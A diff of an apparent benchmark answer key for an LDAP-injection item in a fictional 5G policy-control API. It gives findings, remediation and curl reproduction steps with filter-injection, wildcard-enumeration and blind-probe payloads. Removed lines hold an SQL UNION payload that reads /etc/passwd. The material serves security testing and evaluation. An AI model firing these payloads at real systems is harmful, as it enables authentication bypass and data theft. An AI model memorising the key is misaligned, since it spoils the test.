@@ -1,63 +1,61 @@
 # Expected Response
 
 ## System
-- Domain: Telecom / 5G Core
-- System: SpectreNet Policy Control
+- System: SpectreNet Policy Control v4.2.0
+- Domain: TELECOM / 5G CORE
 - Example ID: INJ-0115
-- Vulnerability: LDAP Injection
+- Risk ID: RISK-INJ-115
+- Vulnerability: LDAP Injection (LDAPi)
 
-## Priority Findings
+## Findings
 
-### Finding 1: LDAP Injection on `/api/v1/users`
-**Severity:** Critical
-**Category:** Injection (from data/knowledge/injections)
+### 1. LDAP Injection on `/api/v1/records?username=` (HAR Primary)
 
-**Summary:**
-The `/api/v1/users` endpoint accepts a `search` query parameter that is directly
-interpolated into a raw database query without sanitization. This enables LDAP Injection (LDAPi),
-allowing an attacker to bypass authentication, extract all records, or execute arbitrary operations.
+The `username` parameter is passed unsanitized to a corporate directory services (LDAP) lookup (Section 2.0: "corporate directory services — primary data store"). The payload `admin)(&(password=*))` injects LDAP filter operators to bypass the username filter, causing the directory to return all entries matching any password — authentication bypass plus full directory enumeration.
+
+**Note on internal inconsistency:** The code snippet (Section 3.0) shows raw SQL string concatenation (`SELECT * FROM records WHERE username = '...'`) which conflicts with the declared LDAP/corporate directory architecture. The HAR payload is an LDAP filter injection (`admin)(&(password=*))`) and the declared vulnerability is LDAP Injection. Primary demonstration uses LDAPi; the SQL path is noted as a secondary code-path debt.
 
 **Evidence from HAR:**
-- Endpoint: `GET /api/v1/users?search=admin)(&(password=*))`
-- Response: HTTP 200 with **all records returned** including password hashes and admin accounts
-- The query constructed: `SELECT * FROM users WHERE search = 'admin)(&(password=*))'`
-  evaluates to true for all rows when the payload is `admin)(&(password=*))`
+- Endpoint: `GET /api/v1/records?username=admin)(&(password=*))`
+- LDAP filter constructed: `(&(username=admin)(&(password=*)))` — password wildcard always matches
+- Response: HTTP 200 with admin and user records including `password_hash` and `role: "ADMIN"`
 
-**Root Cause:**
-- Raw string concatenation used to build database query
-- No parameterized query / prepared statement
-- Application DB account has excessive privileges (`db_owner`)
+## Reproduction
 
-## Steps to Reproduce
-
-### Step 1 — Normal request (baseline)
+**Step 1 — Baseline:**
 ```bash
-curl -s "https://api.spectrenet-poli.example.com/api/v1/users?search=normalvalue" \
+curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=normaluser" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-Expected: Returns matching records only.
+**Expected:** Returns matching directory entry for `normaluser` only.
 
-### Step 2 — Inject LDAPi payload
+**Step 2 — LDAP authentication bypass (primary HAR attack):**
 ```bash
-curl -s "https://api.spectrenet-poli.example.com/api/v1/users?search=admin)(&(password=*))" \
+curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=admin)(%26(password%3D*))" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Vulnerable outcome:** All rows returned, including admin password hashes.
-**Secure outcome:** 400 Bad Request / 0 results / sanitized error message.
+**Vulnerable outcome:** Admin and all other user records returned — authentication bypass via LDAP filter operator injection.
 
-### Step 3 — Privilege escalation (if DB over-privileged)
+**Step 3 — LDAP wildcard: enumerate all directory entries:**
 ```bash
-# SQLi variant: attempt to read OS-level files (if DB runs as LocalSystem)
-curl -s "https://api.example.com/api/v1/users?search=' UNION SELECT null,null,load_file('/etc/passwd')--" \
+curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=*" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
+**Vulnerable outcome:** All directory entries returned — full subscriber/staff directory enumeration. In Telecom/5G Core, this exposes network policy records, subscriber identities, and infrastructure service accounts.
 
-### Step 4 — Verbose error confirmation
+**Step 4 — LDAP blind injection: test for attribute existence:**
 ```bash
-curl -s "https://api.example.com/api/v1/users?search='" \
+curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=admin)(cn%3D*" \
   -H "Authorization: Bearer <VALID_TOKEN>"
 ```
-**Expected verbose error (if misconfigured):** SQL syntax error message leaking table name, column names, or DB version.
+**Vulnerable outcome:** Returns results if `cn` attribute exists in directory — blind LDAP attribute enumeration for schema discovery.
+
+**Step 5 — Verbose error confirmation:**
+```bash
+curl -s "https://api.spectrenet-poli.example.com/api/v1/records?username=%28" \
+  -H "Authorization: Bearer <VALID_TOKEN>"
+```
+**Expected verbose error:** LDAP filter parse error leaking directory service details, attribute names, or server version.
 
 ## Secure Outcome
 ```json
@@ -65,8 +63,9 @@ curl -s "https://api.example.com/api/v1/users?search='" \
 ```
 
 ## Remediation
-1. **Use parameterized queries / prepared statements everywhere:** Replace string concatenation with `?` or named parameters.
-2. **Restrict DB account privileges:** Application account should only have SELECT/INSERT/UPDATE/DELETE on required tables.
-3. **Disable verbose error messages in production:** Return generic 500/400 errors without DB details.
-4. **Deploy input validation middleware:** Reject inputs containing SQL metacharacters (`'`, `"`, `;`, `--`, `/*`).
-5. **ORM audit:** Review all `raw()` or native query calls in ORM usage; apply parameterization.
+- **LDAP input escaping (RISK-INJ-115):** Escape all LDAP special characters in user input (`(`, `)`, `*`, `\`, `NUL`). Use LDAP SDK's built-in escaping: e.g., `ldap.escape(req.query.username)` or `javax.naming.directory.SearchControls` with parameter binding.
+- **Use positional LDAP filter parameters:** Construct filters using parameterized values, not string concatenation.
+- **Restrict LDAP account:** The application service account should only have read access to required OU trees — not full directory admin.
+- **Disable wildcard searches in directory:** Configure LDAP server to reject wildcard-only filter values.
+- **Deploy input validation middleware:** Reject LDAP metacharacters in query parameters.
+- **Disable verbose error messages in production.**
